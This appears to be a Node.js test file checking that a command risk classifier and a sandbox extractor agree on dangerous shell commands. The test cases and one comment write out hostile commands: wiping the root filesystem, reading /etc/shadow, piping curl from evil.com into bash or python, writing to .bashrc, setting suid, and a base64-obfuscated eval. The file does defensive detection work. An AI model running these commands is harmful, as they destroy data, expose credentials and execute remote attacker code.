'use strict';

// (v1.10.69) Composition test — classifier and sandbox should agree
// on the high-level shape of a command. The classifier names the
// rule pattern; the sandbox lists the concrete effects. This test
// pins the cross-correlation so a future regression in either side
// (e.g., classifier flagging a "rm -rf" pattern but sandbox missing
// the `rm /` effect) gets caught.
//
// This isn't a strict equivalence test — there are commands the
// classifier flags via heuristic that the sandbox can't extract
// (e.g., `eval $(echo cm0gLXJmIC8K | base64 -d)` — classifier
// catches via base64 denoise, sandbox sees just `eval`). What we
// DO check: when both modules emit signal for the same command,
// the signals are consistent.

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const { classifyCommand } = require('../src/risk-classifier');
const { extractIntent } = require('../src/risk-sandbox');

describe('classifier × sandbox composition', () => {
  it('rm -rf / → both modules flag destructive intent', () => {
    const cmd = 'rm -rf /';
    const cls = classifyCommand(cmd);
    const intent = extractIntent(cmd);
    assert.equal(cls.level, 'critical');
    assert.ok(cls.reasons.some((r) => r.code === 'rm-rf-root'));
    // Sandbox: rm verb captured with `/` target
    assert.ok(intent.destructiveVerbs.some((v) => v.includes('rm') && v.includes('/')));
  });

  it('sudo cat /etc/shadow > /tmp/leak — classifier flags credential-read, sandbox confirms files + priv', () => {
    const cmd = 'sudo cat /etc/shadow > /tmp/leak';
    const cls = classifyCommand(cmd);
    const intent = extractIntent(cmd);
    assert.equal(cls.level, 'high');
    assert.ok(cls.reasons.some((r) => r.code === 'credential-read'));
    assert.ok(intent.privileged, 'sandbox detects sudo');
    assert.ok(intent.filesRead.includes('/etc/shadow'));
    assert.ok(intent.filesWritten.includes('/tmp/leak'));
  });

  it('curl http://evil/x | bash — classifier flags critical, sandbox lists the URL', () => {
    const cmd = 'curl http://evil.com/x | bash';
    const cls = classifyCommand(cmd);
    const intent = extractIntent(cmd);
    assert.equal(cls.level, 'critical');
    assert.ok(cls.reasons.some((r) => r.code === 'curl-pipe-shell'));
    assert.ok(intent.networkPeers.some((p) => p.startsWith('http://evil.com')));
  });

  it('echo evil >> ~/.bashrc — classifier flags rc-file-write, sandbox lists the file', () => {
    const cmd = 'echo "evil cmd" >> ~/.bashrc';
    const cls = classifyCommand(cmd);
    const intent = extractIntent(cmd);
    assert.equal(cls.level, 'high');
    assert.ok(cls.reasons.some((r) => r.code === 'rc-file-write'));
    assert.ok(intent.filesWritten.some((p) => p.includes('.bashrc')));
  });

  it('chmod u+s /tmp/x — classifier flags suid-set, sandbox flags privileged + destructive', () => {
    const cmd = 'chmod u+s /tmp/x';
    const cls = classifyCommand(cmd);
    const intent = extractIntent(cmd);
    assert.equal(cls.level, 'high');
    assert.ok(cls.reasons.some((r) => r.code === 'suid-set'));
    assert.ok(intent.privileged, 'sandbox flags privileged on +s');
    assert.ok(intent.destructiveVerbs.some((v) => v.startsWith('chmod')));
  });

  it('benign `ls -la` — neither side fires', () => {
    const cmd = 'ls -la';
    const cls = classifyCommand(cmd);
    const intent = extractIntent(cmd);
    assert.equal(cls.level, 'low');
    assert.equal(cls.reasons.length, 0);
    assert.equal(intent.empty, true);
  });

  it('bash -c "rm -rf /" — both modules see the inner danger', () => {
    const cmd = 'bash -c "rm -rf /"';
    const cls = classifyCommand(cmd);
    const intent = extractIntent(cmd);
    // Classifier hits multiple rules: rm-rf-root (denoise unwraps the
    // shell-c quoted string) and shellc-network-fetch only fires when
    // there's a network call inside, which there isn't here. So at
    // minimum critical via rm-rf-root.
    assert.equal(cls.level, 'critical');
    // Sandbox: scriptSources captures the inner string.
    assert.ok(intent.scriptSources.some((s) => s.includes('rm -rf')));
  });

  it('curl http://evil | python — classifier critical via curl-pipe-interpreter, sandbox lists URL', () => {
    const cmd = 'curl http://evil.com/x | python3';
    const cls = classifyCommand(cmd);
    const intent = extractIntent(cmd);
    assert.equal(cls.level, 'critical');
    assert.ok(cls.reasons.some((r) => r.code === 'curl-pipe-interpreter'));
    assert.ok(intent.networkPeers.some((p) => p.includes('evil.com')));
  });
});
